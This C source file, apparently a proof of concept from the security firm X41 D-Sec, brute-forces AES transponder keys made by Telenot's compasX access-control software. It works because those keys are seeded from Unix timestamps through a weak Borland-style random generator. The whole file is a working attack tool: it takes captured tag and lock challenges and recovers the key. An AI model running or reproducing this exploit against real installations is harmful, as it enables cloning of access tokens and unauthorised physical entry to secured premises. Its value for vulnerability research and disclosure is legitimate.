//  Brute forces transponder AES keys generated by Telenot's compasX software
//  Copyright (C) 2022 X41 D-Sec GmbH, Markus Vervier, Yaşar Klawohn
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// requires openssl-devel
// gcc -o brute_key -march=native -Ofast orginal.c -lcrypto
//
// usage: ./$s <unix timestamp> <16 byte tag challenge> <32 byte lock challenge>

// makes it ~14% slower
//#define SPINNER

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <ctype.h>
#include <limits.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/err.h>


uint32_t seed = 0;

static uint32_t borland_rand(void) {
    seed = (seed * 22695477) % UINT_MAX;
    seed = (seed + 1) % UINT_MAX;
    return (seed >> 16) & 0x7fff;
}

static void borland_srand(uint32_t s) {
    seed = s;
    borland_rand();
}

static void make_key(uint32_t s, uint8_t key[]) {
    borland_srand(s);
    for (int i = 0; i < 16; i++) {
        key[i] = borland_rand() % 0xFF;
    }
}

static void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

// source https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption#Decrypting_the_Message
static int decrypt(uint8_t ciphertext[], int ciphertext_len, uint8_t key[], uint8_t iv[], uint8_t plaintext[]) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    if (!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv))
        handleErrors();

    EVP_CIPHER_CTX_set_padding(ctx, 0);

    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

static int hexstr_to_byte_array(char hexstr[], uint8_t bytes[], size_t byte_len) {
    size_t hexstr_len = strlen(hexstr);
    if (hexstr_len % 16) {
        return 1;
    }
    if (byte_len < hexstr_len / 2) {
        return 2;
    }
    char *pos = &hexstr[0];
    for (size_t count = 0; *pos != 0; count++) {
        sscanf(pos, "%2hhx", &bytes[count]);
        pos += 2;
    }
    return 0;
}

int main(int argc, char *argv[]) {

    uint8_t iv[16] = {0x00};
    uint8_t key[16] = {0x00};
    uint8_t dec_tag[16] = {0x00};
    uint8_t dec_rdr[32] = {0x00};
    uint8_t tag_challenge[16]  = {0x00};
    uint8_t lock_challenge[32] = {0x00};

    uint64_t timestamp = atoi(argv[1]);

    if (argc != 4) {
        printf("\nusage: %s <unix timestamp> <16 byte tag challenge> <32 byte lock challenge>\n\n", argv[0]);
        return 1;
    }

    if (hexstr_to_byte_array(argv[2], tag_challenge, sizeof(tag_challenge)))
        return 2;

    if (hexstr_to_byte_array(argv[3], lock_challenge, sizeof(lock_challenge)))
        return 3;

    uint64_t start_time = time(NULL);

    for (; timestamp < start_time; timestamp++) {

        make_key(timestamp, key);
        decrypt(tag_challenge, 16, key, iv, dec_tag);
        decrypt(lock_challenge, 32, key, tag_challenge, dec_rdr);

        // check rol byte first
        if (dec_tag[0] != dec_rdr[31]) continue;

        // compare rest
        if (dec_tag[1] != dec_rdr[16]) continue;
        if (dec_tag[2] != dec_rdr[17]) continue;
        if (dec_tag[3] != dec_rdr[18]) continue;
        if (dec_tag[4] != dec_rdr[19]) continue;
        if (dec_tag[5] != dec_rdr[20]) continue;
        if (dec_tag[6] != dec_rdr[21]) continue;
        if (dec_tag[7] != dec_rdr[22]) continue;
        if (dec_tag[8] != dec_rdr[23]) continue;
        if (dec_tag[9] != dec_rdr[24]) continue;
        if (dec_tag[10] != dec_rdr[25]) continue;
        if (dec_tag[11] != dec_rdr[26]) continue;
        if (dec_tag[12] != dec_rdr[27]) continue;
        if (dec_tag[13] != dec_rdr[28]) continue;
        if (dec_tag[14] != dec_rdr[29]) continue;
        if (dec_tag[15] != dec_rdr[30]) continue;


        printf("\btimestamp: %" PRIu64 "\nkey: ", timestamp);
        for (int i = 0; i < 16; i++) {
            printf("%02x", key[i]);
        }
        printf("\n");
        exit(0);

    }
    printf("key not found\n");
    exit(2);
}
